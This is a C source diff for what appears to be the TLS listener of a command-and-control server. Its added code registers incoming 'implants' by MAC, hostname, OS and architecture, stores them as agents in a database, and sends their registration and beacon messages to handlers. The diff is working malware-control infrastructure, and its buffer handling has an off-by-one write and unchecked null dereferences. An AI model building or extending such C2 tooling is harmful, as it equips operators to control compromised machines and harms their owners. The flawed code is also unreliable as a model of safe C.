@@ -23,6 +23,9 @@
 #include <time.h>
 #include <pthread.h>
 
+#include "beacon_tcp_ssl.h"
+#include "agent.h"
+
 struct tcp_ssl_thread_args {
     SSL *ssl;
     char ip[256];
@@ -41,9 +44,98 @@ void init() {
     OpenSSL_add_ssl_algorithms(); 
     ERR_load_crypto_strings();
 }
+void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
+
+    cJSON *mac = cJSON_GetObjectItem(json, "mac");
+    cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
+    cJSON *os =  cJSON_GetObjectItem(json, "os");
+    cJSON *arch = cJSON_GetObjectItem(json, "arch");
+
+    char input[255];
+    snprintf(input, sizeof(input), "%s-%s-%s-%s", mac->valuestring, hostname->valuestring, os->valuestring, arch->valuestring);
+    char agent_id[65];
+    get_agent_id(input, agent_id);
+
+    // check if id already exists in database
+    if (check_agent_id(agent_id) == 1) goto REPLY;
+
+    //log
+    log_new_agent(agent_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);
+
+    // register to datbase (agent_id, os, ip, mac, hostname)
+    // check if agent id exists
+    struct db_agents args;
+    strncpy(args.agent_id, agent_id, sizeof(args.agent_id) - 1);
+    args.agent_id[sizeof(args.agent_id) - 1] = '\0';
+    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
+    args.os[sizeof(args.os) - 1] = '\0';
+    strncpy(args.ip, ip, sizeof(args.ip) - 1);
+    args.ip[sizeof(args.ip) - 1] = '\0';
+    strncpy(args.mac, mac->valuestring, sizeof(args.mac) - 1);
+    args.mac[sizeof(args.mac) - 1] = '\0';
+    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
+    args.hostname[sizeof(args.hostname) - 1] = '\0';
+
+    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
+    args.arch[sizeof(args.arch) - 1] = '\0';
+    new_agent(args);
+
+    // reply with agent id
+    REPLY:
+    cJSON *json_reply = cJSON_CreateObject();
+    cJSON_AddStringToObject(json_reply, "mode", "ack");
+    cJSON_AddStringToObject(json_reply, "agent_id", agent_id);
+
+    char *reply = cJSON_Print(json_reply);
+    //send(sock, reply, strlen(reply), 0);
+    SSL_write(ssl, reply, strlen(reply));
+
+    free(reply);
+    cJSON_Delete(json_reply);
+}
+
+void *tcp_ssl_agent_handler(void *args) {
+    struct tcp_ssl_thread_args *arg = (struct tcp_ssl_thread_args*)args;
+    SSL *ssl  = arg->ssl;
+
+
+    // recieves message from implant register or beaconing
+    char buffer[BUFFER_SIZE];
+    //int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
+    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer));
+    if (bytes_received <= 0) {
+        perror("recv failed");
+        return NULL;
+    }
+    buffer[bytes_received] = '\0';
+
+    cJSON *json = cJSON_Parse(buffer);
+    if (!json) {
+        printf("Error parsing JSON!\n");
+        return NULL;
+    }
+
+    cJSON *type = cJSON_GetObjectItem(json, "mode");
+    if (strcmp(type->valuestring, "register") == 0) {
+        ssl_register_agent(json, arg->ip, ssl);
+    } else if (strcmp(type->valuestring, "beacon") == 0) {
+        ssl_beacon(json, ssl);
+    } else if (strcmp(type->valuestring, "session") == 0) {
+        // session mode
+        // session();
+    }
+
+    //cJSON_Delete(json);
+    SSL_free(ssl);
+    free(args);
+    return NULL;
+}
+
+
 
 
 void* tcp_ssl_listener(void *port) {
+    init();
     int PORT = *(int*)port;
 
     int serverSock, agentSock;
@@ -136,42 +228,6 @@ void* tcp_ssl_listener(void *port) {
 }
 
 
-void *tcp_ssl_agent_handler(void *args) {
-    struct tcp_ssl_thread_args *arg = (struct tcp_ssl_thread_args*)args;
-    SSL *ssl  = arg->ssl;
-
-
-    // recieves message from implant register or beaconing
-    char buffer[BUFFER_SIZE];
-    //int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
-    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer));
-    if (bytes_received <= 0) {
-        perror("recv failed");
-        return NULL;
-    }
-    buffer[bytes_received] = '\0';
-
-    cJSON *json = cJSON_Parse(buffer);
-    if (!json) {
-        printf("Error parsing JSON!\n");
-        return NULL;
-    }
-
-    cJSON *type = cJSON_GetObjectItem(json, "mode");
-    if (strcmp(type->valuestring, "register") == 0) {
-        register_agent(json, arg->ip, ssl);
-    } else if (strcmp(type->valuestring, "beacon") == 0) {
-        beacon(json, ssl);
-    } else if (strcmp(type->valuestring, "session") == 0) {
-        // session mode
-        // session();
-    }
-
-    //cJSON_Delete(json);
-    SSL_free(ssl);
-    free(args);
-    return NULL;
-}
 
 
 
@@ -239,3 +295,5 @@ cleanup:
     EVP_cleanup();
     ERR_free_strings();
 }
+
+
